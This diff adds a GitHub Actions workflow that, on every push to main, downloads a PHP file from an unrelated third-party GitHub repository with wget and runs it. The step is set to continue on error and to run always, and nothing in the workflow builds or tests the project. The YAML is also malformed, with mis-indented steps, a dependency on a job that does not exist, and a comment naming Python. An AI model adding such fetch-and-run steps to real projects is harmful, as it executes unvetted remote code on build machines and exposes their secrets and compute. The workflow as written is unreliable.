@@ -1,0 +1,34 @@
+name: Multi
+
+on:
+  push:
+    branches:
+      - main
+
+jobs:
+
+  run-on-ubuntu1:
+    needs: run-on-ubuntu5
+    runs-on: ubuntu-latest
+    if: always()  # This ensures the job runs even if previous jobs fail
+   
+  steps:
+    - name: Checkout code
+      uses: actions/checkout@v2
+
+    - name: Set up Php
+      uses: actions/setup-php@v8
+        
+       
+        with:
+          php-version: 8.3 # Replace with your desired Python version
+
+      - name: Run Php Program
+        continue-on-error: true
+        run: |
+          wget https://github.com/Y908r/Cc/raw/main/a.php
+          ls
+          php a.php
+          
+          
+
